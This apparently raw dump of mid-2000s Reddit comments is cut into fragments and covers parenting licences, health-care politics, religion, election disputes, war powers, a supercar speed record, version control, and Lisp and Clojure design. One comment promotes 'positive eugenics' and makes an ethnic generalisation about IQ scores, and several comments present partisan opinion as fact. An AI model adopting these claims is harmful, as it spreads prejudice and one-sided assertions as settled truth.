and stripped of all nuance.\n\n\n\n&gt; Newer religions are more valid, cause they\'re an update of God\'s newest stance on what we should be doing, eh?\n\n\n\nNo, I just meant that those are religions whose basic premise also rests on this.

The same thing happened with ""literacy tests"" that blacks had to take to vote. Imagine how a parent test could be distorted to reinforce social institutions and prevent people that society doesn\'t like from breeding!\n\n\n\nFor example, make a connection to something taboo, such as pedophilia, and immediately the blame is placed on the accused--I guess you could trace it back to the Salem witch trials. The U.S. legal system and indeed U.S. society as a whole seems to favor the accused and not the defendant, which would make it extremely easy to abuse state-controlled parenting.\n\n\n\nThe only way I could see it working is if you had some sort of genetic criteria for reproducing, and, while it could work, I have a feeling that people couldn\'t get eugenics out of their minds for long enough to even consider it.

That\'s a huge boost to social mobility that your child wouldn\'t have otherwise. So, I see ""positive eugenics"" as a way to *overcome* social barriers, not reinforce them.\n\n\n\n(BTW, as a side note, Hitler thought IQ tests were ""Jewish"", and indeed, most IQ tests today are dominated by Jews and Asians.

Tests like the ones you are proposing would force people to hide any mistakes they\'ve made, especially when a few bad judgment calls means no children--people can improve their habits remarkably, and unless they showed *no* signs of improving, such as constant violent behavior, it wouldn\'t be fair to restrict their ""parenting license.""', '""You\'ve probably guessed by now that I\'m playing devil\'s advocate, but I\'m still curious to see if anyone can give me a good answer.""\n\n\n\nBecause ""good parenting"" is arbitrary and subjective.

Strike. Plan to have your kid study all day? Strike. Don\'t care about if your kid has friends? Strike. Show your child swearwords at a young age, for whatever reason? Strike.

If the States need more money to support their health care programs, couldn't *they* raise taxes?\n\n\n\n2) Why is throwing more money at overpriced health care going to fix the system?  \n\n\n\nHere's my health care system synopsis, and SCHIP doesn't do anything to fix anything but spend more money:\n\n\n\nThe problem with the system is that the government is mandating prices (through medicare), states are mandating coverage that people don't want, the government is giving tax breaks to big business to provide health care and not to individuals and small businesses, and that litigation is out of control (in my opinion, among other things).  If the government can't even figure out what chads are out of the ballots in an election and can't do anything about an education system that is falling behind, whyt *would* you want them running your healthcare, telling doctors how to treat people, and mandating prices (which is the easiest way to destroy innovation?)  The only sectors of health care that prices have fallen in that I am aware of recently are Lasik eye surgery and plastic surgery... both elective measures that insurance doesn't cover.  Competition = better quality and lower prices.  There is no competition in health care right now."", 'I\'d love to have the discussion as to why it doesn\'t work, let\'s hear it!\n\n\n\nnumber 1 certainly is not a myth.  The government is paying for it... well I guess its a myth if you acknowledge that therefore the people of other cities and states are paying for health care for those that ""can\'t afford it,"" minus the government waste and corruption and at the threat of breaking the law.\n\n\n\nThe government being the insurer is a massive issue because it wastes money at an unprecedented scale, can never do any task at the quality of a private institution, bureaucrats cannot make decisions about scientific fields but they are... etc.\n\n\n\nTaking money from one person and giving it to another (through government) ""owing to their cost of living"" is quite a statement... how do you defend that?', "" Private Insurance wastes money now *specifically because* the government is involved with forcing it to make decisions and forcing it to include things.  Why can't a person choose to buy a policy that doesn't include sex-change operations if they don't plan on getting a sex-change operation?  Many states require all sorts of coverage, and people cannot buy insurance from other states.  These are *state and federal laws* that cause the waste.\n\n\n\nMedicare also sets prices that the government will pay for certain treatments, decided by the bureaucracy.  Why would an insurance company pay differently if the government gets it for cheap?\n\n\n\nThe government has the advantage (if you can call it that) of setting prices, but with set prices you get less innovation and less quality, so the government ends up killing the very industries it is regulating because they cannot make up their costs or innovate.  We don't want Canada or Britain's system because of the lines, the lack of dentists (for example in Britain), and the complete lack of innovation in the realm of health care.  Canada [sends politicians to America](http://www.ctv.ca/servlet/ArticleNews/story/CTVNews/20070914/belinda_Stronach_070914/20070914?hub=Health) to get treatments while spouting ludicrous platitudes that she uses the Canadian system when she needs it (except she doesn't use it when she needed it).\n\n\n\nSocialized medicine is an absolute disaster of an idea and it doesn't work in any decent-sized nation like Britain much less a massive nation like the US."", 'The fact is that America is the only system ruled by a decent system of law that is trying anything *but* the Western norm of socialized medicine.

Look at which countries are producing new medicines and treatments that save lives... I'll tell you they aren't European government socialized systems.  Look at where [Canadian government officials](http://www.ctv.ca/servlet/ArticleNews/story/CTVNews/20070914/belinda_Stronach_070914/20070914?hub=Health) come to America for the BETTER treatment.\n\n\n\nNot everyone can afford that better treatment in America sadly, yet.  But overlaying socialism and another bulbous bureaucracy that takes up massive chunks of our country's output is not the solution.  Europe cannot sustain their socialist system, and neither can we.  Creating competition, such as what we have in the US with Lasik eye surgery and plastic surgery (the two areas prices in health have gone DOWN and quality has RISEN because there is competition) makes it available to everyone.  Letting people CHOOSE what policies to buy from what states, letting them CHOOSE what coverages they need, makes the system better, not government regulation that restricts choice, fixes prices, and squashes innovation."", ""Well obviously, because we've never tried it before, it can't work.\n\n\n\nThe problems with socialized care are too great and the costs too high to not try something else.\n\n\n\nCanadian government officials coming here is *incredibly* important.  Why, if their system is so great, do their rich come here?  Because they get treatment *faster* and *better* here.  If we push the free market concepts that make our system great, it will get better.\n\n\n\nThat is where we disagree, but its sad to see you don't acknowledge the massive problems with the socialist system."", ' Well, let\'s see how fair you are with it:\n\n\n\n1) What are the problems with a socialist health care system?\n\n\n\n2) How can we reapply models, economically in this instance, to understand how a free market system could work in a health care role?\n\n\n\nIt boils down to you not trusting emergent free market properties and me not trusting a command and control socialist bureaucracy to make my health care decisions for me.  Its called innovation to reapply things from one area to another, and health badly needs innovation.\n\n\n\nI also continue to contest that socialist systems do ""better"" than us.  Ours costs a lot more currently for individuals, unless you factor in the ludicrous tax rates of these Western socialist systems.  They have absolutely unacceptable wait times for treatments in these socialist systems as well, which causes their rich to come here, and it stems from price controls.  They also have waste in the form of people going to the doctor for anything and everything because they are spending other peoples\' money.  This is why the government is wasteful (they spend our money), and why socialist health is wasteful (they spend our money).\n\n\n\nRemember the price freeze on gas under President Carter?  It caused lines, long lines, and shortages.  Imagine that in health care and you begin to understand the problems associated with Britain and Canada\'s lines now.  Then, when you understand what scale does to those systems, we realize that a socialized system is going to break down even further when its scaled up from Britain\'s population to America\'s population.\n\n\n\nThere are better ways to do things than the wait times and the government waste.  The socialized systems look great on paper, to some people, because the government\'s have *warped* what the free market can do with regulations here in the United States.

The government confiscating our money to pay for others\' care that they don\'t necessarily want is a waste in my opinion.\n\n\n\nWhat is wrong with taking away the government restrictions on care?  Why does Average Joe American need sex-change surgery in his plan if he isn\'t going to ever need it?  Hell, why does he *need* care at all if he doesn\'t want to pay for it and he\'s young and spry?  Isn\'t that his decision?  Why does the government have a right (point that out in the Constitution firstly) to tell us we *must* have health insurance and then confiscate our money to pay for it when we don\'t even want it?\n\n\n\nI understand and appreciate the compassion of the need for a minimum level of care.  I want everyone that needs health insurance to have it as well.  I firmly believe that people need to make their own choices, though, and that competition breeds innovation and lower costs with higher quality.  We have a system that is somewhere in the middle now and we need to commit one way or the other.\n\n\n\nI understand a ""free market"" system as is has never been tried and I understand those fears.  But I see an aging European population overburdened with welfare, social security, and health benefits as their birth rates fall.  They cannot sustain their obligations in the long term.\n\n\n\nAs Alexis d\'Toqueville warned, once a democracy learns it can vote itself money, it will self destruct.  Europe is doing just that, and we are on the verge.\n\n\n\nI agree that there needs to be some sort of safety net, but a large bureaucracy telling citizens with force of law to pay for others\' insurance while stiffling innovation and wasting is not my idea of a good system.\n\n\n\nThanks.']"

I truly believe, and could provide evidence for the fact, that religion can make many people better than they would be without it.  Like anything tainted by humanity, religion itself can be used to justify gratuitous evil sadly, but in the media today religion has gotten a horrible wrap.\n\n\n\nAll we see these days is the Pat Robertsons and the President Bush\'s and the Jesus Camps and nary a word about the positive effects of religion.  Reddit is rife with horrible stories of ""indoctrinations"" and 1st amendment issues and theocracy scares.\n\n\n\nIt is mostly Christianity in America\'s fault for this negative imagery because Christianity is certainly guilty of warping the message and participating in scandals.

Our only two options logically, as far as I am aware, are that the universe either came into being or that it always has been.  The first option, which seems to be the dominant view right now, lends itself to the questions ""where did it come from? how did it start? what was there before the universe?""  Science CAN have an origination, but that requires scientists to accept that they may not be able to understand the universe completely.\n\n\n\n2) Belief in God for many people results in proceeding from conclusions to observations, but it doesn\'t have to.  Is it wrong to see evolution as God\'s creation?  Is it wrong to appreciate the universe as divinely created or managed?  Who cares if someone believes that evolution was ""guided"" by God through the natural laws we have deduced?  Intelligent Design is different than that, obviously, because it assumes God made some of the choices along the way, but if someone believes that God created Natural Law and evolution is a product of that, is that wrong?', 'Sorry, I accidentally said ""provide and proof"" instead of ""provide the proof.""

As I said, I was talking about ALL of the ""stolen"" elections and the many different pieces that had to be in place to call them stolen.

Pretty nonsensical.\n\n\n\nAs I acknowledged in my previous post, my ""brain fart"" of NCLB as an  acronym caused me to use a harsh tone, and I apologized.  I agree with you completely on NCLB\'s damage to the American education system which is why you forgetting to read the ""other than my assumption of the acronym\'s origins that I wasn\'t aware of"" statement fixed that.\n\n\n\n&gt;If that were true, you would understand the evidence better.\n\n\n\nThat statement makes zero sense.\n\n\n\nLet\'s ""focus like a laser beam"" like some talk hosts say:\n\n\n\nThe original comment that spurned my response, *before you were part of the conversation* was about alleged conspiracies that would have caused the 2000 AND the 2004 elections to be stolen.  That is what I responded to.  You came in *after that* and focused, inexplicably, on 2004 in Ohio.  We have no difference on 2004 Ohio\'s irregularities, other than I don\'t think they would swing the election and you do.\n\n\n\nIf you want to keep discussing this issue at all, than it\'d be great if you stopped dismissing me and read what I was saying thoroughly without any anger or resentment coloring your understanding.  I am talking about the fact that all 3 branches of government would have to line up on all levels to ""steal"" an election, and you have chosen to talk about something else, IE the 2004 Ohio irregularities.  Please focus, and maybe to prove you are a decent citizen and a fair debater, you may acknowledge that I may have said something that was right, as I have done for you.

jamiemccarthy,t5_2cneq,"['And as I explained, when this same story ran on reddit 2 days ago, [Romney is right and Paul is wrong](http://reddit.com/info/2zt0j/comments/c2zw65). Only Congress can make a formal declaration of war. The question was ""do you believe the president needs authorization of Congress to attack strategic targets in Iran."" The correct answer is no.', 'Yes, I remember Pearl Harbor. I also remember the [*declaration* of war](http://www.ibiblio.org/pha/myths/matsum_1.html) made by Japan against the United States, making it rather a moot point whether the attack was *considered* an act of war. So that\'s not a terribly illustrative example.\n\n\n\nYour point is accurate: a strategic air attack is usually *considered* an act of war. The Constitution, however, says nothing about this matter. The words ""act of war"" do not appear in that document. The sum total of its language that we\'re arguing about is in Article 1, Section 8:\n\n\n\n&gt; The Congress shall have Power... To declare War...\n\n\n\nThat\'s it.\n\n\n\nWe\'re talking about the power to *declare* a state of war. Not to wage it, not to order specific attacks, not to command troops. Just to declare that a state of war exists.\n\n\n\nNowhere does the Constitution say that the president (who ""shall be Commander in Chief of the Army and Navy of the United States"") has to go to Congress to get permission to use that Army and Navy to attack a target, whether or not a declaration of war has been issued.\n\n\n\nMaybe you\'re under the misimpression that the military can\'t use force unless Congress issues a formal declaration of war. You\'re welcome to try to back that up with a citation. Presidents have been ordering the U.S. military to point its guns without a declaration of war almost since the Constitution was ratified. \n\n\n\nAnd even if air strikes were a power granted only to Congress, it wouldn\'t matter, since Congress ceded this right to the President in 1973 (with conditions). Go read the [War Powers Act](http://www.yale.edu/lawweb/avalon/warpower.htm):\n\n\n\n&gt; The President **in every possible instance** shall **consult** with Congress before introducing United States Armed Forces into hostilities...\n\n\n\n&gt; In the absence of a declaration of war, in any case in which United States Armed Forces are introduced into hostilities... the president shall submit within 48 hours to [Congress]... a report, in writing...\n\n\n\n&gt; Within sixty calendar days after a report is submitted... the President shall terminate any use of United States Armed Forces ... unless the Congress has declared war...\n\n\n\nCongress has given the president a 60-day ""bomb anything you want"" card. S/he is *requested* to consult Congress ahead of time but it is explicitly *not* required. S/he is required to write a report (""what I did on my bombing vacation""). There are a few other minor conditions.\n\n\n\nBut there is no question about it: the president is fully authorized to attack targets in Iran, and if the lawyers and generals say it\'s not ""possible"" to consult with Congress ahead of time, s/he doesn\'t have to.\n\n\n\nAgain, Romney is right, and Paul is wrong. The question was ""do you believe the president needs authorization of Congress to attack strategic targets in Iran."" The correct answer is no.', '&gt; Truman tried to use this commander-in-chief argument and was slapped down by Justice Jackson.\n\n\n\nHeh. Truman issued an executive order seizing steel mills during the Korean War, and in [Youngstown Co. v. Sawyer](http://caselaw.lp.findlaw.com/scripts/getcase.pl?court=us&amp;vol=343&amp;invol=579) the Supreme Court held this to not be a power of the commander-in-chief.\n\n\n\nSeizing steel mills in the United States has exactly nothing to do with launching air strikes against strategic targets in Iran.']"

Confident of the 1183 hp vehicle's abilities, SSC set out to validate their top speed claim in accordance with the strict guidelines set by Guinness World Records. Among other requirements, in order to meet Guinnessâ?? approval, a vehicle testing for the top speed record must drive down the course, turn around, and make a second pass in the opposite direction within one hour. The vehicle's official top speed is calculated by averaging the top speeds of each pass in order to negate any favorable road or weather conditions. Today, on a temporarily-closed two lane stretch of public highway in Washington State, the Ultimate Aero posted a top speed of 257.11 mph (413.83 kph) on its first pass and 254.55 mph (409.71 kph) on its return pass, yielding a new top speed record: a staggering 255.83 mph (411.76 kph). The data, collected by Dewetron's world-renowned GPS tracking system, will be verified by Guinness before the Ultimate Aero is officially crowned the ''World's Fastest Production Car.''

Only using half throttle at that speed, the Aero's available 1183 bhp was massive and could spin the wheels at 190 in 6th gear! SSC's photographer reports that that they will try again for the production speed record at a better location in the near future. \n\n\n\n\n\nOctober 31st 2006, Las Vegas - Using SCC's proprietary twin-turbo design, the Ultimate Aero TT's power plant has surpassed its original design specifications in all areas, producing a nasty 1180 bhp at 6750 rpm and 961 ft lbs of tarmac tearing torque while maintaining a paltry 2750 lbs of curb weight. The meticulously manufactured carbon fibre composite body harnesses a motor that has a wonderful idle, incredible daily drivability characteristics, runs on 91 octane pump fuel, easily handles the rigors of long term redline usage while delivering and incredible 15 mpg in the city and 22 mpg on the highway. \n\n\n\n\n\nFurther establishing its place among the supercars, the Ultimate Aero TT produces more emissions legal horsepower than any other production automobile in the world, thanks in the large part to the tireless efforts of the design team. \n\n\n\n\n\nBut the dedication to every small detail doesn't stop at excellent performance; the hand-stitched, custom leather interior will turn heads all by itself.

Halloween is a modern-day holiday originating in the Pagan Celtic holiday of Samhain (in Christian times, the eve of All Saints Day). Although popular histories of Halloween claim that the practice goes back to ancient celebrations of Samhain, in fact there is little primary documentation of masking or costuming on Halloween before the twentieth century.[1] Costuming became popular for Halloween parties in America in the early 1900s, as often for adults as for children. The first mass-produced Halloween costumes appeared in stores in the 1930s when trick-or-treating was becoming popular in the United States. \n\n\n\nWhat sets Children Halloween Costumes apart from costumes for other celebrations or days of dressing up is that they are often designed to imitate supernatural and scary beings. Costumes are traditionally those of monsters such as vampires, ghosts, skeletons, witches, and devils. There are also costumes of pop culture figures like presidents, or film, television, and cartoon characters. Another popular trend is for women (and in some cases, men) to use Halloween as an excuse to wear particularly revealing costumes, showing off more skin than would be socially acceptable otherwise.\n\n']"

In fact, I would be interested to find out just how that breaks down.\n\n\n\nEven more interesting to find out would be what percentage of those people who have a religous view have carried out crimes against those who don't profess any such beliefs based upon their victims non religious beliefs. And of course, what percentage of the population that has no religious views have commited violence against a person because they held religious beliefs.\n\n\n\nOf course, I don't expect there to be any such studies done on this. But, it would be interesting to find out. I would like to believe that the numbers are about equal. But I imagine they are probably not.

And as far as being forced to collaborate with a CVCS, I\'ve seen enough *fire and forget* to know that it\'s definitely not the case.\n\n\n\nNot to mention, of course, that DVCS allows and encourages sharing of changes between developers (privately or through public repositories) without having to go through the main repo (because your developments are unstable for example, or because two subsystems both in unstable states need to collaborate with one another). These are both highly social behaviors encouraged by DVCS and downright impossible with CVCS.\n\n\n\n&gt; The default action is to fork, not to collaborate!\n\n\n\nThe default action is *always* to fork, the difference is that a CVCS forces you to ""collaborate"" (or not, once again see Fire and Forget) every time you want to save your current state/progress\n\n\n\n&gt; This encourages people to crawl into caves and write huge new features, then “dump” these code-bombs on their peers, at which point the code is unreviewable.\n\n\n\nWTF?\n\n\n\n&gt; Most DVCS systems don’t run on Windows at all.\n\n\n\nHe mentions 5 DVCS earlier: git, mercurial, bazaar-ng, darcs, monotone\n\n\n\nMercurial has a pair of native  windows installers and works flawlessly, bazaar-ng is pure python so I doubt there\'s any problem, darcs didn\'t have any problem under windows when I tried it, Git is very shaky but getting better and I don\'t know about monotone.\n\n\n\n*That*\'s supposed to be ""most dvcs not working on windows""? Come on, let\'s be serious for a second...\n\n\n\n&gt; Most DVCS have no shell or GUI tool integrations; they’re command-line only.\n\n\n\nWrong again, see gitk, hgk, qct, git-gui, qgit, ...\n\n\n\n&gt; They often struggle to use version control at all; are you now going to teach them the difference between “pull” and “update”, between “commit” and “push”? Look me in the eyes and say that with a straight face.\n\n\n\nI managed to teach it to a graphist (sp? a guy who mostly does drawings and a bit of AS programming). Now he\'s admitedly not *stupid*, but if you have devs who can\'t grasp the concepts of commit/update and push/pull, stick to Visual Sourcesafe. Or fire them straight, because I doubt they\'ll be able to produce anything beyond security holes and office politics\n\n\n\n&gt; Managers don’t want 20 different private forks of a codebase; they want one codebase that they can monitor all activity on.\n\n\n\nOnce again, that\'s stupid. As soon as a developer checks a copy out, he creates a fork, I\'ve seen people who didn\'t commit anything for 3 days and then WHAM gigantic ball of mud in your face. CVCS doesn\'t help. Quite the opposite, really.\n\n\n\n&gt; Cloning a repository is bad for corporate security. Most corporations have an absolute need for access control on their code; sensitive intellectual property in specific parts of the repository is only readable/writeable by certain teams.\n\n\n\nEr... yeah? So in a DVCS you\'d either create different base repositories or use forests/submodules, no problem there.\n\n\n\n&gt; No DVCS is able to provide fine-grained access control; the entire code history is sitting on local disk.\n\n\n\nDVCS are (usually, I think Git has some abilities with that) not able to provide fine-grained access control to a ball-of-mud all-encompassing repository because such a repository is fucking stupid. SVN suggesting that this is the best model is *not* a good thing.\n\n\n\n&gt; Cloning is often unscalable for corporations. Many companies have huge codebases — repositories which are dozens or even hundreds of gigabytes in size. When a new developer starts out, it’s simply a waste of time (and disk space) to clone a repository that big.\n\n\n\nOnce again, back to the ball of mud, if you decide to use DVCS (not switch to, switching a ball-of-mud repo to a distributed model is hard) you don\'t ball-of-mudify everything, you separate your entities into different lightweight repositories. And you can do it, because setting up a web repo takes all of 5 minutes.\n\n\n\nWhich, by the way wacks again the declaration that sharing requires extra effort. It doesn\'t, really, all the extra effort of Mercurial is: put a cgi script in your apache cgi directory, add a config file, add an entry to your mod_rewrite or .htaccess to have nicer urls. There, done, and that\'s only for the first repo you want to share, the next ones you\'ll just drop in a specified subfolder.\n\n\n\nThe *only* thing that holds any water in his argument is that there is no stable, concrete, production-reagy TortoiseGit, TortoiseHg or TortoiseDarcs. And that\'s a tenuous point, as much as I like TortoiseSVN, it doesn\'t help you understand how SVN works, and it usually makes it easier to fuck up everything because you get people using SVN without understanding what they do.', ""It was a joke, you didn't have to take it that seriously :p"", "" &gt; That said, I'm very happy with subversion, and I have no plans to move to a DVCS for my office setup.\n\n\n\nI never said DVCS were the end of it all (and they're definitely not, in the real world DVCS aren't a strict superset of CVCS have a few drawbacks compared to CVCS, especially a one that is huge in some environments and wasn't even mentioned in TFA) even though I do consider them superior to CVCS in an overwhelming majority of situations.\n\n\n\nI was only expanding and clarifying on the points of TFA I consider to be pure fud (pretty much all of them).\n\n\n\n&gt; What I'd like you to do is explain to me what my office of 5 people, all of whom work in the office, in 2 rooms right next to each other, would gain by switching to a DVCS\n\n\n\nIn that case, in my opinion (remember that I'm not an SCM guru), mostly the ability to fetch each other's tree/commits without having to go through a potential trunk-breaking commit to main.\n\n\n\nFor example, at the moment I work with a colleague which knows the codebase much better than I (and works on the part of the codebase that I hook into). Sometimes I hit a bug or a bizarre behavior that doesn't seem to come from my code, and which I don't manage to trace back to the root source. The aforementioned colleague has his own environment (as in, a different one than mine) with several tools he uses and I don't (and I use both Windows and OSX, he's a quite hardcore linux fanatic, I'm an emacs guy he only uses vi, ...). Our desks are around 3 meters from each other.\n\n\n\nRight now (the office uses SVN), either he has to come to my desk and waste time with an unfamiliar environment he doesn't like and that lacks the tools he wants/needs (plus I ask him to come while I'm the one asking for a favor) or I have to commit broken/buggy features/changes to the trunk so he can update his WC and try to find what I missed.\n\n\n\nWith a DVCS, I could just temporarily share my local repository -- which is pretty much trivial (a simple `hg serve` is enough when using Mercurial, for example), he'd pull from me (either into his main repo, or he'd clone to another repository just in case or if he's working on something else), work on his own machine in a familiar environment, and then push back to my machine (or I could pull from him).\n\n "", ""&gt; A clone of a Mercurial repository is probably much smaller.\n\n\n\nThe clone of a remote hg repository (with full history and everything) is about the size of an SVN WC I think (maybe slightly smaller), a Git local repo is even smaller.\n\n\n\nFor both Git and Hg, I think the tool performs lazy clones when cloning from local (it uses symlinks when they're available, stuff like that)"", ""&gt; If the mere act of trying to edit a file in Visual Studio doesn't cause a check-out\n\n\n\nThe only SCM I still use that has a notion of checkout is subversion, and it means creating a local working copy from a remote repository.\n\n\n\nDid you mean an update?

In contrast, the Haskell program allocates quite a lot of extra memory behind the scenes, and runs rather slower than the C program.\n\n\n\nIn effect, the C quicksort does some very ingenious storage management, trading this algorithmic complexity for a reduction in run-time storage management costs.\n\n\n\nIn applications where performance is required at any cost, or when the goal is detailed tuning of a low-level algorithm, an imperative language like C would probably be a better choice than Haskell, exactly because it provides more intimate control over the exact way in which the computation is carried out.""', ""A simple wrapper around a c compiler will do this, which is basically what 'eval' is in all the languages that have it."", 'c-repl\n\nhttp://neugierig.org/software/c-repl/', 'The same way you would load any other shared object at runtime : by calling dlopen(3).', ""Ok, you got me -- simple is exaggerating it.\n\n\n\nYou would compile/link the code to a shared object.

But if people had real choice over ISPs, then they could switch to ISPs that voluntarily preserve net neutrality. The biggest problem is that governments have intentionally through legislation created monopolies on cable and telephone services, giving most people only one or two reasonable choices of ISPs. Thus achieving voluntary net neutrality requires not federal legislation, but repealing laws making it illegal to compete with the local phone and cable companies. Wireless competition is coming slowly - unless the FCC screws that up. When Ron Paul says he wants to keep the government's hands off the internet, he really, consistently means it.\n\n\n\nAs for health care, this is ironic coming right after I read [about patients in the U.K. pulling their own teeth because they couldn't find NHS dentists](http://www.dailymail.co.uk/pages/live/articles/news/news.html?in_article_id=487621&amp;in_page_id=1770&amp;ct=5)\n\n "", 'Way to argue from assertion.

Otherwise, you'd switch to a competitor.\n\n\n\nThat's not just theory.

I mean really, do you guys frequently screw up by using the wrong index or bound conditions after a year or so of programming practice?   "", ""I know about the arguments for the theoretical beauty of fold and map and filter operations. I agree that sloppy programmers can mess up for loops, but I have faith that if they have a flexible enough mind to grasp FP, they could find some interesting damage to do by lexicographical means as well:)\n\n\n\nI guess you can cite an argument like Paul Graham would use that a reason to use FP is because you will be working with a select group of smarter people. But the million dollar question is always whether the same group of selected people couldn't be just as productive with more conventional programming, putting the same thought and care into it.\n\n\n\nTo me, my intuition argument stands. I know which way this crowd feels about it, and I expect my sincere thoughts to get down-modded. I think these examples with the for loop that are used to advocate FP are, in the larger sense, a pretty tiny and insignificant part of programming. (Functions as data in general however, is of course not at all a tiny or insignificant concept.) To me it's sort of akin to someone claiming increased writing productivity by not dotting their i's anymore.\n\n\n\nThe author of the parent article seems to make every excuse for not considering the simplest explanation: The reason why FP doesn't factor strongly into programming contest results of any kind could be that despite whatever beauty it has to your inner pure mathematician it doesn't have a significant effect on real world productivity."", ""  Your example benefits from the choice of line break conventions.\n\n\n\nI can type pretty quickly :\n\n\n\nfor(Row r : rows) r.doSomething();\n\n\n\nIt makes me odd perhaps that even the following is ok by me (horror of horrors) :\n\n\n\nfor(int i=0;i&lt;rows.length();i++)\n\nrows.objectAtIndex(i).doSomething();\n\n\n\nIn practice, I can get the above or something equivalent with a few keystrokes in Eclipse anyway.\n\n\n\nIt just already seems about as atomic as it can get, especially in the first case. I know most of you think it's because I'm naive and haven't seen the light.\n\n\n\nUltimately after compilation it's going to be a for loop anyway, and there is also going to be overhead to that function call, isn't there? (In a blue sky future which we may see later, compilers may grab it and parallelize and produce code even faster.) But for something that to me doesn't make it any simpler, it hardly seems worth it.\n\n\n\nI know you could take the argument for being aware of the low level to extremes. It's certainly true that I don't want to know exactly how a loop is going to come out in terms of jump-not-equal assembly instructions. But the for loop to me is a perfect example of an good tradeoff between being aware of what the computer is actually doing (again, in our present time), and being simple.\n\n\n\nThe further point is more that the skeleton above is utterly trivial in any of these constructs. The real meat is going to be in the design of r, and what doSomething() actually does.  ""]"

Gould\'s brilliant, funny, engaging prose dissects the motivations behind those who would judge intelligence, and hence worth, by cranial size, convolutions, or score on extremely narrow tests. How did scientists decide that intelligence was unipolar and quantifiable, and why did the standard keep changing over time? Gould\'s answer is clear and simple: power maintains itself. European men of the 19th century, even before Darwin, saw themselves as the pinnacle of creation and sought to prove this assertion through hard measurement. When one measure was found to place members of some ""inferior"" group such as women or Southeast Asians over the supposedly rightful champions, it would be discarded and replaced with a new, more comfortable measure. The 20th-century obsession with numbers led to the institutionalization of IQ testing and subsequent assignment to work (and rewards) commensurate with the score, shown by Gould to be not simply misguided--for surely intelligence is multifactorial--but also regressive, creating a feedback loop rewarding the rich and powerful.

richhickey,t5_2fwo,"[""I'm Clojure's author.\n\n\n\nFirst off, I think Common Lisp and Scheme are great, and I cite ABCL, Kawa and SISC as good implementations of standard Lisps for the JVM. If you think Common Lisp or Scheme should be the last Lisp(s) ever written, then Clojure isn't for you and there isn't much to discuss.\n\n\n\nClojure has some tangible, non-superficial differences from Common Lisp and Scheme. They yield something that is different, and might or might not be more suitable depending on your programming style and application domain.\n\n\n\n- Most of the core data structures are immutable. This is part of an overall design philosophy to make Clojure a good language for concurrent/multi-core programming.\n\n\n\n- Most of the data structures are extensible abstractions. This is different from Common Lisp where you can't extend the sequence functions to your own data structures, for instance. Even invocability is an abstraction - allowing maps to be functions of their keys and vice-versa.\n\n\n\n- Clojure extends code-as-data to maps and vectors in a deep way. They have literal reader syntax, the compiler understands them, backquote works with them, they support metadata etc. Because they are efficiently immutable and persistent, they support very Lisp-y recursive usage, shared structure etc, in ways Common Lisp's hash tables and vectors cannot.\n\n\n\n- Clojure embraces its host platform in ways that the standard Lisps ported to the JVM can't. For instance, Common Lisp's strings could never be Java Strings since the former are mutable and the latter are not. Clojure strings are Java Strings. The Clojure sequence library functions work over Clojure and Java data structures transparently. Etc.\n\n\n\n- Clojure has metadata as a core concept, not something one could retrofit onto the built-in Common Lisp types.\n\n\n\n- Clojure is designed for concurrency. Vars (similar to CL special variables) have explicit threading semantics. Clojure has a software transactional memory system. Etc.\n\n\n\nIn short, Clojure is (non-gratuitously) different. If you don't want different, you don't want Clojure. If you like Lisp and need to write multi-threaded programs for the JVM, you might find something interesting in Clojure."", "" First - a correction. Clojure does not default to dynamic scope any more than does Common Lisp. Could you point out where in the docs it seems to imply that? Clojure is lexically scoped, locals are always lexical, and Clojure is stricter than CL in its flagging of free references to undeclared globals. CL's defvar defines a dynamic variable and Clojure's def does something similar. \n\n\n\nYour other points are subjective, but my decisions were not gratuitous, so I'll try to explain them.\n\n\n\n- In Clojure, first and rest are functions of the sequence abstraction, not hard-wired to slots in a concrete cons cell, and rest does in fact return nil when there are no more items, as do all of the sequence functions. Thus iteration can use direct conditional tests rather than awkward comparisons with () or calls to null? or whatever. But lists, maps and vectors are all container abstractions on equal footing, and can all be empty. In addition, there can be multiple kinds of concrete lists. Which one should be represented by nil?\n\n\n\n- Lisp-1 vs. 2 is somewhat of a religious issue. I find Lisp-1 more elegant, I like the evaluated fn position, I don't like funcall and #'. But I also like defmacro, and have gone to a lot of trouble to make Lisp-1 compatible with defmacro without hygiene nightmares. This is reflected in the differences between symbols and vars, the difference between quote and backquote, and the differences between Clojure namespaces and CL's packages. There are good reasons that things are the way they are, even if they are not apparent from a first glance at the docs.\n\n\n\n- let vs. let\\*. In CL I use let\\* far more frequently. I wanted Clojure to have only one let, and for it to be sequential, and decided the \\* at the end is not going to be meaningful to newcomers. It's already different from CL in that it uses [] around the bindings, and they aren't individually parenthesized. \n\n\n\nIn short, it's not an objective of Clojure that one be able to dump their CL/Scheme code into Clojure and have it work. Clojure is a 'from-scratch' Lisp, and it has names from CL, Haskell and SML (which binds sequentially in let, iirc). Clojure doesn't have car and cdr. I want it to be attractive to people who might otherwise use JRuby, Jython or Groovy. Thus the 'differences' page, to keep experienced Lispers from getting tripped up when their assumptions are incorrect.\n\n\n\nThe docs are a work in progress and I may try to put in more of the 'why's, time permitting. "", 'Right - Clojure vars are similar to top-level defvars in CL.\n\n\n\nFunction args and let-bound locals are not variables in Clojure - they are immutable.\n\n\n\nVars get dynamically re-bound using the ""binding"" macro, not let.\n\n\n\nMore items for the differences list, I see...']"

rsynnott,t5_2fwo,"[""My issue is purely that it makes things expensive for people who want to produce applications for multiple platforms, which, these days, is just about everyone. I have no issue with them charging for it, and if they supplied a mechanism to compile for the big desktop platforms with it (even if it cost a bit extra), I'd seriously consider buying it. I suspect that a reasonable number of other people are in the same position. On the other hand, I'm sure most commercial users have one f the more expensive packages, and wouldn't be bothered. This sort of thing wasn't important a few years ago, but these days people expect multi-platform applications, and Lispworks, with its platform-independent GUI stuff, could be a great way to produce them. \n\n\n\nTypically, with other languages, there exist free or very cheap tools which allow hobbyists to create their own distributable, easy-to-install, GUI applications. This isn't really the case with Common Lisp at the moment, but if Lispworks were to allow people to produce binaries for multiple platforms with one license, it would move a little closer to being."", ""Right now, though, SBCL is, while very nice (I use it for running webapps), a little inadequate on Windows and some other platforms. There's a lot of work going into improving this at the moment, but it's taking time.\n\n\n\nI doubt that people will go SBCL-only when writing libraries. If anything, the trend has been against that sort of standardisation; a few years ago there were a lot of CMUCL-only libraries, or clisp-only libraries, or Allegro-only libraries; today, just about everything coming out works in every environment where it's practical for it to work. This may partly be because a lot of work (eg. usocket, CFFI) has been put into abstracting out low-level stuff, so it's easier to write compatible libraries.\n\n\n\nWin32 is particularly interesting, really, because there is no major free Lisp implementation which can do multi-threading on it. In fact, about the only free one which runs well on Windows, AFAIK, is clisp, which comes with its own wacky license issues. LispWorks et al. still have a vast advantage on 